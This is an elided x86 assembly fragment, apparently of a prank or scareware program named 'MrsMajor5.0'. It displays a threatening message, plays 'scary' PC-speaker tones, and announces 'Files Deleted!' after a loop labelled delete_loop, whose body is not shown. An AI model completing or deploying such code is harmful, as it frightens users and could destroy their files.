...
start:
    ...
    ; Display "MrsMajor5.0 NOW IN YOUR NIGHTMARES!" message with delay
    call display_mrsmajor_message
...
delete_loop:
    ...
    ; Display "Files Deleted!" message
    call display_files_deleted_message
...
scary_sounds:
    ...
    ; Generate additional scary sounds
    ; Low-pitched sound
    mov al, 0xB6
    out 0x43, al
    mov ax, 0x0F00
...
delay:
    ; Simple delay loop for holding sound or message
    mov cx, 0xFFFF
delay_loop:
    dec cx
    jnz delay_loop
...
display_mrsmajor_message:
    ...
    ; Add a delay after displaying the "MrsMajor5.0" message
    call delay

    ret

display_files_deleted_message:
    ; Display "Files Deleted!" message immediately
    mov ah, 0x0E
    mov bl, 0x0C
    mov al, 'F'
    call print_char
